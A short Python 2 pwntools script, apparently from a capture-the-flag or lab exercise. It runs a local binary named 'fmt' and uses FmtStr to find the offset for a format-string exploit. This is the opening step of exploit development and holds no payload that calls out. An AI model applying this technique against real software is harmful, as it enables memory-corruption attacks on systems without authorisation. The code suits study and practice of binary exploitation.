#!/usr/bin/env python

from pwn import *

def execfmt(payload):
    p = process('./fmt')
    p.recvuntil('? ')
    p.sendline(payload)
    info = p.recv()
    p.close()
    return info
autofmt = FmtStr(execfmt)
print autofmt.offset
